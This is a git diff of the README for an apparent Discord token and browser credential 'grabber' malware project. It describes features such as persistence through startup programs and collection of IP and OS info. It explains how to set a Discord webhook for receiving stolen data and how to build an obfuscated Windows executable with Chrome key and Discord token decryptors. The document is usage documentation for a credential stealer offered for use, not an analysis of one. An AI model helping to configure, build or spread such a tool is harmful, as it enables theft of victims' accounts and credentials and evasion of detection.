@@ -17,6 +17,7 @@
 Some of these functionalities are customisable in the [`config.js`](config.js) file. You can find more details in [the wiki](https://github.com/JustYuuto/Grabber/wiki/Functionalities). Items in bold are functionalities you can get hyped with!
 
 * Made for Windows, but can work on macOS and Linux with Wine
+* Easy to build
 * Can add itself to startup programs
 * Can get IP info
 * Can get OS info: RAM, OS version, computer name...
@@ -44,9 +45,6 @@ Webhook
 To use and build this grabber, you'll need to download these things:
 
 * [Node.js](https://nodejs.org/en)
-* [Visual Studio Build Tools](https://aka.ms/vs/17/release/vs_BuildTools.exe)
-* [Python](https://www.python.org/downloads/)
-* [nasm](https://www.nasm.us/)
 * Minimum knowledge in using JavaScript objects, booleans and strings
 
 ### Getting the code
@@ -60,11 +58,11 @@ You can:
 
 ### Configuration
 
-Some things need to be configured (in the [`config.js`](config.js) file) before building the final exe, like the Webhook URL. If you don't know how to create a webhook, [you can learn it](https://support.discord.com/hc/en-us/articles/228383668). You can [click here](https://github.com/JustYuuto/Grabber/wiki/Configuration) for documentation about configuration items.
+Some things need to be configured (in the [`config.js`](config.js) file) before building the executable, like the webhook URL. If you don't know how to create a webhook, [you can learn it](https://support.discord.com/hc/en-us/articles/228383668). You can [click here](https://github.com/JustYuuto/Grabber/wiki/Configuration) for documentation about configuration items.
 
 ### Building the executable
 
-After configuring the grabber, we can finally build it! Run the following command in the project folder:
+After configuring the grabber, we can finally build its executable! Run the following command in the project folder:
 
 ```bash
 npm run build
@@ -72,7 +70,15 @@ npm run build
 yarn build
 ```
 
-As you don't have a compiled node.js with nexe, nexe will build what sounds like a "custom node.js". 
+**What is going on after running the command**:
+* Build Chrome-based browsers key decryptors
+* Build Discord token decryptor
+* Build the icon into a ``.ico`` file
+* Build the executable which will:
+  * Run webpack for minification and obfuscation
+  * Run Electron builder for building the executable
+
+The executable can be found at ``dist/<exe name provided in the config>.exe``.
 
 ## Todo
 
@@ -85,5 +91,5 @@ I, Yuuto, and other contributors, will not accept any responsibility case for da
 ## Donating
 
 If you find this project useful, consider donating:
-* PayPal : https://paypal.me/nethermctv
+
 * Ethereum Address : 0xf27851244c96d70b363c7641b99a2ee8ca818ba5
